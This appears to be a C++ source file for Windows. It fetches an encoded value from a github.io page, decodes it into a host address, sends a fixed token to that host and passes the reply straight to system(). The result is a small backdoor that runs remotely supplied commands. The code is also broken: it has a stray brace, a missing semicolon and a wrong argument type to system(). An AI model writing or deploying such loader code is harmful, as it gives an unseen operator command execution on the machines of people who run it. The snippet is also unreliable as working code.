// Created on 2/11/2025.
#include <windows.h>
#include <WinInet.h>
#include <iostream>
#include <cstdlib>
//link with -lwininet
std::string send_request(const char* server, const char* page, const char *verb = "GET", const char *payload = 0){
    std::string result;
    HINTERNET internet, connect, request;
    if(!(internet = InternetOpen("WinInet Test", INTERNET_OPEN_TYPE_PRECONFIG, 0, 0, 0)) ||
       !(connect = InternetConnect(internet, server, INTERNET_DEFAULT_HTTPS_PORT, 0, 0, INTERNET_SERVICE_HTTP, 0, 1)) ||
       !(request = HttpOpenRequest(connect, verb, page, 0, 0, 0, INTERNET_FLAG_KEEP_CONNECTION | INTERNET_FLAG_SECURE, 1))) {
        InternetCloseHandle(request);
        InternetCloseHandle(connect);
        InternetCloseHandle(internet);
        return "";
    }
    bool s = HttpSendRequest(request, 0, 0, payload, 0);
    char data[10000];
    while(s) {
        DWORD bytes;
        bool read = InternetReadFile(request, data, sizeof(data) - 1, &bytes);
        if (!read || !bytes) break;
        data[bytes] = 0;
        result += data;
    }
    return result;
}
std::string ify(const std::string& s) {
    std::string result;
    int count = 0;
    for (char c : s) {
        result += c;
        if (!(count++ % 3) && (count < s.length()))
            result += '.';
    }
    }
    return result;
}
int main(){
    std::string s = send_request("amagicman123456.github.io", "/bd/")
    for (char& i : s) i -= 97;
    system(send_request(ify(s), "/", "POST", "ADSOFU1S"));
    return 0;
}